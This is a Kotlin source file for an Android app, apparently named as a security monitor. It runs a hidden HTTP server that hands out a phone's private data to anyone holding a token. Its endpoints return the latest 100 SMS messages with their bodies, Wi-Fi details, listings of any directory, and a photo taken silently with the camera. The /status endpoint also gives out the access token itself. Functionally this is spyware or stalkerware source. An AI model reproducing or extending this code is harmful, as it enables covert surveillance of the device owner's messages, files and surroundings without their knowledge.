package com.monitor.security

import android.content.Context
import android.provider.Telephony
import fi.iki.elonen.NanoHTTPD
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class ApiServer(private val ctx: Context, port: Int) : NanoHTTPD(port) {

    override fun serve(session: IHTTPSession): Response {
        if (session.headers["x-token"] != MonitorService.TOKEN) {
            return newFixedLengthResponse(
                Response.Status.UNAUTHORIZED, MIME_PLAINTEXT, "Unauthorized"
            )
        }

        return when (session.uri) {
            "/status"   -> getStatus()
            "/sms"      -> getSMS()
            "/wifi"     -> getWifi()
            "/archivos" -> getArchivos(session.parameters["path"]?.get(0) ?: "/sdcard")
            "/foto"     -> getFoto()
            else        -> newFixedLengthResponse(
                Response.Status.NOT_FOUND, MIME_PLAINTEXT, "Not found"
            )
        }
    }

    private fun getStatus(): Response {
        val json = JSONObject().apply {
            put("status", "online")
            put("ip", MonitorService.obtenerIP(ctx))
            put("token", MonitorService.TOKEN)
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString())
    }

    private fun getSMS(): Response {
        val result = JSONArray()
        val cursor = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 100"
        )
        cursor?.use {
            while (it.moveToNext()) {
                result.put(JSONObject().apply {
                    put("address", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "")
                    put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
                    put("date", it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                    put("type", it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)))
                })
            }
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", result.toString())
    }

    private fun getWifi(): Response {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        val info = wm.connectionInfo
        val json = JSONObject().apply {
            put("ssid", info.ssid)
            put("bssid", info.bssid)
            put("ip", MonitorService.obtenerIP(ctx))
            put("rssi", info.rssi)
            put("speed", info.linkSpeed)
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString())
    }

    private fun getArchivos(path: String): Response {
        val result = JSONArray()
        try {
            File(path).listFiles()?.forEach {
                result.put(JSONObject().apply {
                    put("nombre", it.name)
                    put("esDirectorio", it.isDirectory)
                    put("tamaño", it.length())
                    put("ruta", it.absolutePath)
                })
            }
        } catch (e: Exception) {
            return newFixedLengthResponse(
                Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, e.message
            )
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", result.toString())
    }

    private fun getFoto(): Response {
        return try {
            val file = File(ctx.cacheDir, "foto_temp.jpg")
            Runtime.getRuntime().exec(
                arrayOf("termux-camera-photo", "-c", "0", file.absolutePath)
            ).waitFor()
            if (file.exists()) {
                newFixedLengthResponse(
                    Response.Status.OK, "image/jpeg",
                    file.inputStream(), file.length()
                )
            } else {
                newFixedLengthResponse(
                    Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "No se pudo capturar foto"
                )
            }
        } catch (e: Exception) {
            newFixedLengthResponse(
                Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, e.message
            )
        }
    }
}
